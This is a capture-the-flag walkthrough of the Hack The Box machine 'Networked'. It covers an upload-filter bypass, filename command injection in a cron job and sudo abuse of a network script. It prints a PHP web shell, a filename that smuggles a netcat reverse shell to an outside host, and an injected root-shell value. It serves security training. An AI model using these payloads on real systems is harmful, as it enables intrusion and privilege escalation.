# Hack The Box: Networked

**Difficulty:** Easy
**OS:** Linux

Networked is an Easy-level Linux machine designed to demonstrate common vulnerabilities in poorly coded PHP applications, focusing on insecure file upload mechanisms and command injection. The initial compromise requires bypassing an image upload filter to upload a PHP script and then exploiting a Local File Inclusion (LFI) or direct execution vulnerability to execute it. Privilege escalation involves pivoting through users by exploiting a cron job that executes a vulnerable Bash script, and subsequently exploiting a `sudo` configuration involving a network configuration script.

---

## Reconnaissance

We begin the assessment with a standard Nmap scan against the target IP address to discover open ports and running services.

```bash
nmap -p- --min-rate 10000 10.10.10.146
nmap -p 22,80 -sCV 10.10.10.146
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 7.4p1 CentOS)
*   **Port 80:** HTTP (Apache httpd 2.4.6)

Navigating to the web service on port 80 displays a simple Apache landing page or generic index file. We perform directory brute-forcing using a tool like `gobuster` or `feroxbuster` to identify application paths.

```bash
gobuster dir -u http://10.10.10.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The directory enumeration reveals two important endpoints:
*   `/uploads`
*   `/backup`

### Source Code Analysis

We access the `/backup` directory and find a tarball named `backup.tar`. We download this file and extract it.

```bash
wget http://10.10.10.146/backup/backup.tar
tar -xf backup.tar
```

The extraction yields several PHP files: `index.php`, `upload.php`, `lib.php`, and `photos.php`. Having the source code allows us to analyze the application's logic directly.

## Web Application Analysis

We analyze the `upload.php` script. This script handles image uploads.

```php
// Snippet from upload.php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["myFile"]["name"]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));

// Check if image file is a actual image or fake image
if(isset($_POST["submit"])) {
    $check = getimagesize($_FILES["myFile"]["tmp_name"]);
    // ...
```

The script performs several checks:
1.  **File Size:** It verifies the file is not too large.
2.  **MIME Type (`getimagesize`):** It checks the file's "magic bytes" (file header) to ensure it appears to be a valid image format.
3.  **Extension:** It verifies the file extension (e.g., `.jpg`, `.png`).

### Bypassing Image Upload Restrictions

To upload a PHP web shell, we must bypass these filters. We craft a polyglot file—a file that is both a valid image and a valid PHP script.

We create a file that begins with the magic bytes for a GIF image (`GIF89a;`), followed by a PHP payload. We save this file with a double extension (e.g., `shell.php.gif`) or an allowed image extension if an LFI vulnerability exists to execute it later.

```bash
# Creating the payload
echo "GIF89a;" > shell.php.jpg
echo "<?php system(\$_REQUEST['cmd']); ?>" >> shell.php.jpg
```

Because Apache often executes files based on the presence of a known extension anywhere in the filename (like `.php` within `.php.jpg`), we attempt to upload `shell.php.jpg`.

We access the `/upload.php` page (typically located at the root directory alongside `index.php`) and upload our crafted image.

The application accepts the file because it passes the `getimagesize()` check (due to the `GIF89a;` header) and has an allowed extension.

We navigate to the `/uploads` directory (discovered earlier) and access our uploaded shell.

```text
http://10.10.10.146/uploads/10_10_14_X.php.jpg?cmd=id
```
*(The upload script renames files based on the uploading IP address).*

The command executes successfully. We use the web shell to spawn a reverse shell to our attacking machine.

```bash
nc -lnvp 9999
# Connection received
id
# uid=48(apache) gid=48(apache) groups=48(apache)
```

## Lateral Movement

We gain initial access as the `apache` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is not accessible in our current directory. Checking `/home` reveals a user named `guly`.

Enumerating the system as `apache`, we inspect the crontab and running processes using tools like `pspy`. We also review the files within `/home/guly`.

### Exploiting a Cron Job and Command Injection

We discover a script named `check_attack.php` located in `/home/guly`.

```bash
cat /home/guly/check_attack.php
```

This PHP script is executed periodically via a cron job running as the user `guly`.

```php
// Snippet from check_attack.php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
// ...
foreach ($files as $key => $value) {
    $msg = "rm -f $path$value";
    exec($msg);
}
```

The script iterates through files in the `/uploads/` directory. For each file, it constructs a shell command (`rm -f <path><filename>`) and executes it using the `exec()` function.

Because we have write access to the `/uploads/` directory as the `apache` user, we can create a file with a malicious name. The script unsafely concatenates the filename into the shell command without sanitization.

We can exploit this command injection vulnerability by creating a file whose name contains shell metacharacters (e.g., `;`, `|`, `&`) to break out of the `rm` command and execute arbitrary commands as `guly`.

We create a file in the `/uploads/` directory containing a reverse shell payload in its name.

```bash
touch '/var/www/html/uploads/; nc -c bash 10.10.14.X 8888'
```

When the cron job executes `check_attack.php`, the script attempts to delete the file. The command it constructs becomes:
`rm -f /var/www/html/uploads/; nc -c bash 10.10.14.X 8888`

The shell executes the `rm` command (which fails on the semicolon) and then executes our reverse shell command as the user `guly`.

```bash
nc -lnvp 8888
# Connection received
id
# uid=1000(guly) gid=1000(guly) groups=1000(guly)
```

We retrieve the `user.txt` flag from Guly's home directory.

## Privilege Escalation

Enumerating the system as `guly`, we check for commands the user can run using `sudo`.

```bash
sudo -l
```

The output reveals that the user `guly` can run a specific network configuration script as `root` without a password.

```text
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

### Abusing Sudo & Network Configuration Scripts

We analyze the `/usr/local/sbin/changename.sh` bash script.

```bash
cat /usr/local/sbin/changename.sh
```

The script asks the user for input to configure a network interface (e.g., setting the `NAME` or `PROXY_METHOD` variables in a network script like `/etc/sysconfig/network-scripts/ifcfg-guly`).

```bash
# Snippet from changename.sh
echo -n "interface NAME: "
read NAME
echo -n "interface PROXY_METHOD: "
read PROXY_METHOD
# ...
```

The vulnerability lies in how CentOS/RedHat network scripts handle configuration files. When network scripts process files in `/etc/sysconfig/network-scripts/`, they source them. If a variable contains an unescaped space followed by an executable command, the shell executing the script will interpret the command.

Specifically, if an environment variable (like `NAME`) contains a command followed by a space, the network configuration tool (like `ifup` or `nmcli`) may execute it when processing the interface.

We execute the permitted `sudo` command.

```bash
sudo /usr/local/sbin/changename.sh
```

When prompted for the interface `NAME`, we input a malicious payload designed to execute `/bin/bash` or read the root flag.

```text
interface NAME: a /bin/bash
interface PROXY_METHOD: none
# ...
```

The script writes this input into the network configuration file. When the script subsequently reloads the network interface or when the configuration file is sourced, the injected command `/bin/bash` is executed as root.

```bash
# id
uid=0(root) gid=1000(guly) euid=0(root) groups=1000(guly)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
